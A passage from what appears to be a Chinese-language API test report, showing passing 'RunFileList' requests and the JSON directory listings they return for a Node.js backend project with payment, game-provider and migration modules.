<summary>点击展开查看完整响应 (1752 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": []
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": []
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": []
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": []
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": []
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": []
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": []
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": []
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": []
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": []
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": []
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

---

### ✅ 32. 应该通过 RunFileList 操作获取 src\libs 文件列表

**操作**: `RunFileList (src\libs)`

**请求体**:
```json
{
  "path": "src\\libs",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1053 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "BitmapCacheManager.js",
      "path": "src\\libs\\BitmapCacheManager.js",
      "type": "file"
    },
    {
      "name": "CacheManager.js",
      "path": "src\\libs\\CacheManager.js",
      "type": "file"
    },
    {
      "name": "google",
      "path": "src\\libs\\google",
      "type": "directory",
      "children": []
    },
    {
      "name": "HttpClient.js",
      "path": "src\\libs\\HttpClient.js",
      "type": "file"
    },
    {
      "name": "prisma.js",
      "path": "src\\libs\\prisma.js",
      "type": "file"
    },
    {
      "name": "queue",
      "path": "src\\libs\\queue",
      "type": "directory",
      "children": []
    },
    {
      "name": "Scheduler.js",
      "path": "src\\libs\\Scheduler.js",
      "type": "file"
    },
    {
      "name": "SyncManager.js",
      "path": "src\\libs\\SyncManager.js",
      "type": "file"
    },
    {
      "name": "TaskWorkflow.js",
      "path": "src\\libs\\TaskWorkflow.js",
      "type": "file"
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 测试已知存在的路径 src\libs

---

### ✅ 33. 应该通过 RunFileList 操作递归获取文件列表

**操作**: `RunFileList (递归)`

**请求体**:
```json
{
  "path": "src",
  "recursive": true
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (75221 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": [
        {
          "name": "advertising.js",
          "path": "src\\config\\advertising.js",
          "type": "file"
        },
        {
          "name": "agent.js",
          "path": "src\\config\\agent.js",
          "type": "file"
        },
        {
          "name": "appBury.js",
          "path": "src\\config\\appBury.js",
          "type": "file"
        },
        {
          "name": "banner.js",
          "path": "src\\config\\banner.js",
          "type": "file"
        },
        {
          "name": "behaviorTracking.js",
          "path": "src\\config\\behaviorTracking.js",
          "type": "file"
        },
        {
          "name": "businessStrategy.js",
          "path": "src\\config\\businessStrategy.js",
          "type": "file"
        },
        {
          "name": "cc.js",
          "path": "src\\config\\cc.js",
          "type": "file"
        },
        {
          "name": "config.js",
          "path": "src\\config\\config.js",
          "type": "file"
        },
        {
          "name": "constant.js",
          "path": "src\\config\\constant.js",
          "type": "file"
        },
        {
          "name": "crowd.js",
          "path": "src\\config\\crowd.js",
          "type": "file"
        },
        {
          "name": "dailyCheckin.js",
          "path": "src\\config\\dailyCheckin.js",
          "type": "file"
        },
        {
          "name": "errCode.js",
          "path": "src\\config\\errCode.js",
          "type": "file"
        },
        {
          "name": "game.js",
          "path": "src\\config\\game.js",
          "type": "file"
        },
        {
          "name": "gameServer.js",
          "path": "src\\config\\gameServer.js",
          "type": "file"
        },
        {
          "name": "logger.js",
          "path": "src\\config\\logger.js",
          "type": "file"
        },
        {
          "name": "mail.js",
          "path": "src\\config\\mail.js",
          "type": "file"
        },
        {
          "name": "morgan.js",
          "path": "src\\config\\morgan.js",
          "type": "file"
        },
        {
          "name": "passport.js",
          "path": "src\\config\\passport.js",
          "type": "file"
        },
        {
          "name": "pay.js",
          "path": "src\\config\\pay.js",
          "type": "file"
        },
        {
          "name": "platformConfig.js",
          "path": "src\\config\\platformConfig.js",
          "type": "file"
        },
        {
          "name": "playerRank.js",
          "path": "src\\config\\playerRank.js",
          "type": "file"
        },
        {
          "name": "profile.js",
          "path": "src\\config\\profile.js",
          "type": "file"
        },
        {
          "name": "publish.js",
          "path": "src\\config\\publish.js",
          "type": "file"
        },
        {
          "name": "pushEvent.js",
          "path": "src\\config\\pushEvent.js",
          "type": "file"
        },
        {
          "name": "roles.js",
          "path": "src\\config\\roles.js",
          "type": "file"
        },
        {
          "name": "rwRule.js",
          "path": "src\\config\\rwRule.js",
          "type": "file"
        },
        {
          "name": "sms.js",
          "path": "src\\config\\sms.js",
          "type": "file"
        },
        {
          "name": "tgconfig.js",
          "path": "src\\config\\tgconfig.js",
          "type": "file"
        },
        {
          "name": "tokens.js",
          "path": "src\\config\\tokens.js",
          "type": "file"
        },
        {
          "name": "transaction.js",
          "path": "src\\config\\transaction.js",
          "type": "file"
        },
        {
          "name": "turntable.js",
          "path": "src\\config\\turntable.js",
          "type": "file"
        },
        {
          "name": "vip.js",
          "path": "src\\config\\vip.js",
          "type": "file"
        },
        {
          "name": "wagerDebt.js",
          "path": "src\\config\\wagerDebt.js",
          "type": "file"
        },
        {
          "name": "wallet.js",
          "path": "src\\config\\wallet.js",
          "type": "file"
        },
        {
          "name": "wholeStat.js",
          "path": "src\\config\\wholeStat.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": [
        {
          "name": "advertising.controller.js",
          "path": "src\\controllers\\advertising.controller.js",
          "type": "file"
        },
        {
          "name": "agent.controller.js",
          "path": "src\\controllers\\agent.controller.js",
          "type": "file"
        },
        {
          "name": "announcement.controller.js",
          "path": "src\\controllers\\announcement.controller.js",
          "type": "file"
        },
        {
          "name": "appbury.controller.js",
          "path": "src\\controllers\\appbury.controller.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.controller.js",
          "path": "src\\controllers\\audienceBaseConfig.controller.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.controller.js",
          "path": "src\\controllers\\audienceClassification.controller.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.controller.js",
          "path": "src\\controllers\\audienceGroup.controller.js",
          "type": "file"
        },
        {
          "name": "auth.controller.js",
          "path": "src\\controllers\\auth.controller.js",
          "type": "file"
        },
        {
          "name": "banner.controller.js",
          "path": "src\\controllers\\banner.controller.js",
          "type": "file"
        },
        {
          "name": "broadcast.controller.js",
          "path": "src\\controllers\\broadcast.controller.js",
          "type": "file"
        },
        {
          "name": "config.controller.js",
          "path": "src\\controllers\\config.controller.js",
          "type": "file"
        },
        {
          "name": "dailyCheckIn.controller.js",
          "path": "src\\controllers\\dailyCheckIn.controller.js",
          "type": "file"
        },
        {
          "name": "dbSnapshot.controller.js",
          "path": "src\\controllers\\dbSnapshot.controller.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.controller.js",
          "path": "src\\controllers\\fruitMachineDraw.controller.js",
          "type": "file"
        },
        {
          "name": "game",
          "path": "src\\controllers\\game",
          "type": "directory",
          "children": [
            {
              "name": "game.controller.js",
              "path": "src\\controllers\\game\\game.controller.js",
              "type": "file"
            },
            {
              "name": "provider",
              "path": "src\\controllers\\game\\provider",
              "type": "directory",
              "children": [
                {
                  "name": "evo.controller.js",
                  "path": "src\\controllers\\game\\provider\\evo.controller.js",
                  "type": "file"
                },
                {
                  "name": "facai.controller.js",
                  "path": "src\\controllers\\game\\provider\\facai.controller.js",
                  "type": "file"
                },
                {
                  "name": "inout.controller.js",
                  "path": "src\\controllers\\game\\provider\\inout.controller.js",
                  "type": "file"
                },
                {
                  "name": "oneapi.controller.js",
                  "path": "src\\controllers\\game\\provider\\oneapi.controller.js",
                  "type": "file"
                },
                {
                  "name": "pt.controller.js",
                  "path": "src\\controllers\\game\\provider\\pt.controller.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "giftcode.controller.js",
          "path": "src\\controllers\\giftcode.controller.js",
          "type": "file"
        },
        {
          "name": "googlepush.controller.js",
          "path": "src\\controllers\\googlepush.controller.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.controller.js",
          "path": "src\\controllers\\inactiveUser.controller.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\controllers\\index.js",
          "type": "file"
        },
        {
          "name": "kefu.controller.js",
          "path": "src\\controllers\\kefu.controller.js",
          "type": "file"
        },
        {
          "name": "lobby.controller.js",
          "path": "src\\controllers\\lobby.controller.js",
          "type": "file"
        },
        {
          "name": "mail.controller.js",
          "path": "src\\controllers\\mail.controller.js",
          "type": "file"
        },
        {
          "name": "online.controller.js",
          "path": "src\\controllers\\online.controller.js",
          "type": "file"
        },
        {
          "name": "pay.controller.js",
          "path": "src\\controllers\\pay.controller.js",
          "type": "file"
        },
        {
          "name": "playerRanking.controller.js",
          "path": "src\\controllers\\playerRanking.controller.js",
          "type": "file"
        },
        {
          "name": "rank.controller.js",
          "path": "src\\controllers\\rank.controller.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.controller.js",
          "path": "src\\controllers\\rechargeOrder.controller.js",
          "type": "file"
        },
        {
          "name": "redPoint.controller.js",
          "path": "src\\controllers\\redPoint.controller.js",
          "type": "file"
        },
        {
          "name": "slap.controller.js",
          "path": "src\\controllers\\slap.controller.js",
          "type": "file"
        },
        {
          "name": "sms.controller.js",
          "path": "src\\controllers\\sms.controller.js",
          "type": "file"
        },
        {
          "name": "test.controller.js",
          "path": "src\\controllers\\test.controller.js",
          "type": "file"
        },
        {
          "name": "ticket.controller.js",
          "path": "src\\controllers\\ticket.controller.js",
          "type": "file"
        },
        {
          "name": "turntable.controller.js",
          "path": "src\\controllers\\turntable.controller.js",
          "type": "file"
        },
        {
          "name": "userGroup.controller.js",
          "path": "src\\controllers\\userGroup.controller.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.controller.js",
          "path": "src\\controllers\\userPrivacy.controller.js",
          "type": "file"
        },
        {
          "name": "version.controller.js",
          "path": "src\\controllers\\version.controller.js",
          "type": "file"
        },
        {
          "name": "vip.controller.js",
          "path": "src\\controllers\\vip.controller.js",
          "type": "file"
        },
        {
          "name": "wallet.controller.js",
          "path": "src\\controllers\\wallet.controller.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.controller.js",
          "path": "src\\controllers\\withdrawOrder.controller.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": [
        {
          "name": "components.yml",
          "path": "src\\docs\\components.yml",
          "type": "file"
        },
        {
          "name": "swaggerDef.js",
          "path": "src\\docs\\swaggerDef.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": [
        {
          "name": "BitmapCacheManager.js",
          "path": "src\\libs\\BitmapCacheManager.js",
          "type": "file"
        },
        {
          "name": "CacheManager.js",
          "path": "src\\libs\\CacheManager.js",
          "type": "file"
        },
        {
          "name": "google",
          "path": "src\\libs\\google",
          "type": "directory",
          "children": [
            {
              "name": "dailyPushTest.js",
              "path": "src\\libs\\google\\dailyPushTest.js",
              "type": "file"
            },
            {
              "name": "example.js",
              "path": "src\\libs\\google\\example.js",
              "type": "file"
            },
            {
              "name": "FirebaseMessagingClient.js",
              "path": "src\\libs\\google\\FirebaseMessagingClient.js",
              "type": "file"
            },
            {
              "name": "GooglePushConfig.js",
              "path": "src\\libs\\google\\GooglePushConfig.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\libs\\google\\index.js",
              "type": "file"
            },
            {
              "name": "PushNotificationManager.js",
              "path": "src\\libs\\google\\PushNotificationManager.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "HttpClient.js",
          "path": "src\\libs\\HttpClient.js",
          "type": "file"
        },
        {
          "name": "prisma.js",
          "path": "src\\libs\\prisma.js",
          "type": "file"
        },
        {
          "name": "queue",
          "path": "src\\libs\\queue",
          "type": "directory",
          "children": [
            {
              "name": "DelayQueueAbstract.js",
              "path": "src\\libs\\queue\\DelayQueueAbstract.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\libs\\queue\\index.js",
              "type": "file"
            },
            {
              "name": "redis",
              "path": "src\\libs\\queue\\redis",
              "type": "directory",
              "children": [
                {
                  "name": "index.js",
                  "path": "src\\libs\\queue\\redis\\index.js",
                  "type": "file"
                },
                {
                  "name": "redis.md",
                  "path": "src\\libs\\queue\\redis\\redis.md",
                  "type": "file"
                },
                {
                  "name": "RedisMqDelayQueue.js",
                  "path": "src\\libs\\queue\\redis\\RedisMqDelayQueue.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "Scheduler.js",
          "path": "src\\libs\\Scheduler.js",
          "type": "file"
        },
        {
          "name": "SyncManager.js",
          "path": "src\\libs\\SyncManager.js",
          "type": "file"
        },
        {
          "name": "TaskWorkflow.js",
          "path": "src\\libs\\TaskWorkflow.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": [
        {
          "name": "auth.js",
          "path": "src\\middlewares\\auth.js",
          "type": "file"
        },
        {
          "name": "context.js",
          "path": "src\\middlewares\\context.js",
          "type": "file"
        },
        {
          "name": "error.js",
          "path": "src\\middlewares\\error.js",
          "type": "file"
        },
        {
          "name": "ip.js",
          "path": "src\\middlewares\\ip.js",
          "type": "file"
        },
        {
          "name": "ipWhiteList.js",
          "path": "src\\middlewares\\ipWhiteList.js",
          "type": "file"
        },
        {
          "name": "mch.js",
          "path": "src\\middlewares\\mch.js",
          "type": "file"
        },
        {
          "name": "pay",
          "path": "src\\middlewares\\pay",
          "type": "directory",
          "children": [
            {
              "name": "account.js",
              "path": "src\\middlewares\\pay\\account.js",
              "type": "file"
            },
            {
              "name": "channelCheck.js",
              "path": "src\\middlewares\\pay\\channelCheck.js",
              "type": "file"
            },
            {
              "name": "goods.js",
              "path": "src\\middlewares\\pay\\goods.js",
              "type": "file"
            },
            {
              "name": "ifscCheck.js",
              "path": "src\\middlewares\\pay\\ifscCheck.js",
              "type": "file"
            },
            {
              "name": "orderBuilding.js",
              "path": "src\\middlewares\\pay\\orderBuilding.js",
              "type": "file"
            },
            {
              "name": "orderFrequencyRestricted.js",
              "path": "src\\middlewares\\pay\\orderFrequencyRestricted.js",
              "type": "file"
            },
            {
              "name": "paymentCallback.js",
              "path": "src\\middlewares\\pay\\paymentCallback.js",
              "type": "file"
            },
            {
              "name": "paymentCallbackChannel.js",
              "path": "src\\middlewares\\pay\\paymentCallbackChannel.js",
              "type": "file"
            },
            {
              "name": "paymentCallbackVerify.js",
              "path": "src\\middlewares\\pay\\paymentCallbackVerify.js",
              "type": "file"
            },
            {
              "name": "paymentContext.js",
              "path": "src\\middlewares\\pay\\paymentContext.js",
              "type": "file"
            },
            {
              "name": "restrictedAreas.js",
              "path": "src\\middlewares\\pay\\restrictedAreas.js",
              "type": "file"
            },
            {
              "name": "withdrawPostProcess.js",
              "path": "src\\middlewares\\pay\\withdrawPostProcess.js",
              "type": "file"
            },
            {
              "name": "withdrawRiskCheck.js",
              "path": "src\\middlewares\\pay\\withdrawRiskCheck.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "rateLimiter.js",
          "path": "src\\middlewares\\rateLimiter.js",
          "type": "file"
        },
        {
          "name": "responseCache.js",
          "path": "src\\middlewares\\responseCache.js",
          "type": "file"
        },
        {
          "name": "s2sAuthentication.js",
          "path": "src\\middlewares\\s2sAuthentication.js",
          "type": "file"
        },
        {
          "name": "simpleSign.js",
          "path": "src\\middlewares\\simpleSign.js",
          "type": "file"
        },
        {
          "name": "sms.js",
          "path": "src\\middlewares\\sms.js",
          "type": "file"
        },
        {
          "name": "validate.js",
          "path": "src\\middlewares\\validate.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": [
        {
          "name": "full_schema.prisma",
          "path": "src\\modules\\full_schema.prisma",
          "type": "file"
        },
        {
          "name": "migrations",
          "path": "src\\modules\\migrations",
          "type": "directory",
          "children": [
            {
              "name": "20250623161703_add_placement_domain_fields",
              "path": "src\\modules\\migrations\\20250623161703_add_placement_domain_fields",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250623161703_add_placement_domain_fields\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250812141152_add_ticket_record",
              "path": "src\\modules\\migrations\\20250812141152_add_ticket_record",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250812141152_add_ticket_record\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250826152455_add_broadcast_info",
              "path": "src\\modules\\migrations\\20250826152455_add_broadcast_info",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250826152455_add_broadcast_info\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250915163128_add_cmsemailstaffsetting",
              "path": "src\\modules\\migrations\\20250915163128_add_cmsemailstaffsetting",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250915163128_add_cmsemailstaffsetting\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251126124434_guanxi_vip_week",
              "path": "src\\modules\\migrations\\20251126124434_guanxi_vip_week",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20251126124434_guanxi_vip_week\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251211150940_guanxi_reflux",
              "path": "src\\modules\\migrations\\20251211150940_guanxi_reflux",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20251211150940_guanxi_reflux\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20260105173319_guanxi_gameround",
              "path": "src\\modules\\migrations\\20260105173319_guanxi_gameround",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20260105173319_guanxi_gameround\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20260127143818_third_party_user",
              "path": "src\\modules\\migrations\\20260127143818_third_party_user",
              "type": "directory",
              "children": []
            }
          ]
        },
        {
          "name": "published",
          "path": "src\\modules\\published",
          "type": "directory",
          "children": [
            {
              "name": "2025061815",
              "path": "src\\modules\\published\\2025061815",
              "type": "directory",
              "children": [
                {
                  "name": "20250603110847_diff",
                  "path": "src\\modules\\published\\2025061815\\20250603110847_diff",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250603110847_diff\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250605210444_userattrib",
                  "path": "src\\modules\\published\\2025061815\\20250605210444_userattrib",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250605210444_userattrib\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250606114838_add_operation_center_r",
                  "path": "src\\modules\\published\\2025061815\\20250606114838_add_operation_center_r",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250606114838_add_operation_center_r\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250606180317_add_operation_center_r_customerId",
                  "path": "src\\modules\\published\\2025061815\\20250606180317_add_operation_center_r_customerId",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250606180317_add_operation_center_r_customerId\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250612183505_fix_all_model",
                  "path": "src\\modules\\published\\2025061815\\20250612183505_fix_all_model",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250612183505_fix_all_model\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250613161515_add_operation_center_r_customer_type",
                  "path": "src\\modules\\published\\2025061815\\20250613161515_add_operation_center_r_customer_type",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250613161515_add_operation_center_r_customer_type\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250618.sql",
                  "path": "src\\modules\\published\\2025061815\\20250618.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025062001",
              "path": "src\\modules\\published\\2025062001",
              "type": "directory",
              "children": [
                {
                  "name": "20250620115524_gx_transaction",
                  "path": "src\\modules\\published\\2025062001\\20250620115524_gx_transaction",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025062001\\20250620115524_gx_transaction\\migration.sql",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "2025070717",
              "path": "src\\modules\\published\\2025070717",
              "type": "directory",
              "children": [
                {
                  "name": "20250613141103_add_relation_cdkcode",
                  "path": "src\\modules\\published\\2025070717\\20250613141103_add_relation_cdkcode",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025070717\\20250613141103_add_relation_cdkcode\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250722113407_guanxi_wager",
                  "path": "src\\modules\\published\\2025070717\\20250722113407_guanxi_wager",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025070717\\20250722113407_guanxi_wager\\migration.sql",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "2025082917",
              "path": "src\\modules\\published\\2025082917",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025082917\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025090814",
              "path": "src\\modules\\published\\2025090814",
              "type": "directory",
              "children": [
                {
                  "name": "20250829173149_wallet",
                  "path": "src\\modules\\published\\2025090814\\20250829173149_wallet",
                  "type": "directory",
                  "children": []
                }
              ]
            },
            {
              "name": "2025091615",
              "path": "src\\modules\\published\\2025091615",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025091615\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251010171400_guanxi_player_rank",
              "path": "src\\modules\\published\\20251010171400_guanxi_player_rank",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\20251010171400_guanxi_player_rank\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025101614",
              "path": "src\\modules\\published\\2025101614",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025101614\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251215174320_guanxi_account",
              "path": "src\\modules\\published\\20251215174320_guanxi_account",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\20251215174320_guanxi_account\\migration.sql",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "schema.prisma",
          "path": "src\\modules\\schema.prisma",
          "type": "file"
        }
      ]
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": [
        {
          "name": "v1",
          "path": "src\\routes\\v1",
          "type": "directory",
          "children": [
            {
              "name": "advertising.route.js",
              "path": "src\\routes\\v1\\advertising.route.js",
              "type": "file"
            },
            {
              "name": "agent.route.js",
              "path": "src\\routes\\v1\\agent.route.js",
              "type": "file"
            },
            {
              "name": "announcement.route.js",
              "path": "src\\routes\\v1\\announcement.route.js",
              "type": "file"
            },
            {
              "name": "appbury.route.js",
              "path": "src\\routes\\v1\\appbury.route.js",
              "type": "file"
            },
            {
              "name": "audienceBaseConfig.route.js",
              "path": "src\\routes\\v1\\audienceBaseConfig.route.js",
              "type": "file"
            },
            {
              "name": "audienceClassification.route.js",
              "path": "src\\routes\\v1\\audienceClassification.route.js",
              "type": "file"
            },
            {
              "name": "audienceGroup.route.js",
              "path": "src\\routes\\v1\\audienceGroup.route.js",
              "type": "file"
            },
            {
              "name": "auth.route.js",
              "path": "src\\routes\\v1\\auth.route.js",
              "type": "file"
            },
            {
              "name": "banner.js",
              "path": "src\\routes\\v1\\banner.js",
              "type": "file"
            },
            {
              "name": "broadcast.route.js",
              "path": "src\\routes\\v1\\broadcast.route.js",
              "type": "file"
            },
            {
              "name": "config.route.js",
              "path": "src\\routes\\v1\\config.route.js",
              "type": "file"
            },
            {
              "name": "dailyCheckIn.route.js",
              "path": "src\\routes\\v1\\dailyCheckIn.route.js",
              "type": "file"
            },
            {
              "name": "dbSnapshot.route.js",
              "path": "src\\routes\\v1\\dbSnapshot.route.js",
              "type": "file"
            },
            {
              "name": "docs.route.js",
              "path": "src\\routes\\v1\\docs.route.js",
              "type": "file"
            },
            {
              "name": "fruitMachineDraw.route.js",
              "path": "src\\routes\\v1\\fruitMachineDraw.route.js",
              "type": "file"
            },
            {
              "name": "game",
              "path": "src\\routes\\v1\\game",
              "type": "directory",
              "children": [
                {
                  "name": "game.route.js",
                  "path": "src\\routes\\v1\\game\\game.route.js",
                  "type": "file"
                },
                {
                  "name": "provider",
                  "path": "src\\routes\\v1\\game\\provider",
                  "type": "directory",
                  "children": [
                    {
                      "name": "evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "facai.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\facai.route.js",
                      "type": "file"
                    },
                    {
                      "name": "index.js",
                      "path": "src\\routes\\v1\\game\\provider\\index.js",
                      "type": "file"
                    },
                    {
                      "name": "inout_evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\inout_evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "inout_jdy.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\inout_jdy.route.js",
                      "type": "file"
                    },
                    {
                      "name": "oneapi.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\oneapi.route.js",
                      "type": "file"
                    },
                    {
                      "name": "oneapi_evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\oneapi_evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "pt.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\pt.route.js",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "giftcode.route.js",
              "path": "src\\routes\\v1\\giftcode.route.js",
              "type": "file"
            },
            {
              "name": "googlepush.route.js",
              "path": "src\\routes\\v1\\googlepush.route.js",
              "type": "file"
            },
            {
              "name": "inactiveUser.route.js",
              "path": "src\\routes\\v1\\inactiveUser.route.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\routes\\v1\\index.js",
              "type": "file"
            },
            {
              "name": "kefu.route.js",
              "path": "src\\routes\\v1\\kefu.route.js",
              "type": "file"
            },
            {
              "name": "lobby.route.js",
              "path": "src\\routes\\v1\\lobby.route.js",
              "type": "file"
            },
            {
              "name": "mail.route.js",
              "path": "src\\routes\\v1\\mail.route.js",
              "type": "file"
            },
            {
              "name": "online.route.js",
              "path": "src\\routes\\v1\\online.route.js",
              "type": "file"
            },
            {
              "name": "pay.route.js",
              "path": "src\\routes\\v1\\pay.route.js",
              "type": "file"
            },
            {
              "name": "playerRanking.route.js",
              "path": "src\\routes\\v1\\playerRanking.route.js",
              "type": "file"
            },
            {
              "name": "rank.route.js",
              "path": "src\\routes\\v1\\rank.route.js",
              "type": "file"
            },
            {
              "name": "rechargeOrder.route.js",
              "path": "src\\routes\\v1\\rechargeOrder.route.js",
              "type": "file"
            },
            {
              "name": "redPoint.route.js",
              "path": "src\\routes\\v1\\redPoint.route.js",
              "type": "file"
            },
            {
              "name": "slap.route.js",
              "path": "src\\routes\\v1\\slap.route.js",
              "type": "file"
            },
            {
              "name": "sms.route.js",
              "path": "src\\routes\\v1\\sms.route.js",
              "type": "file"
            },
            {
              "name": "test.route.js",
              "path": "src\\routes\\v1\\test.route.js",
              "type": "file"
            },
            {
              "name": "ticket.route.js",
              "path": "src\\routes\\v1\\ticket.route.js",
              "type": "file"
            },
            {
              "name": "turntable.route.js",
              "path": "src\\routes\\v1\\turntable.route.js",
              "type": "file"
            },
            {
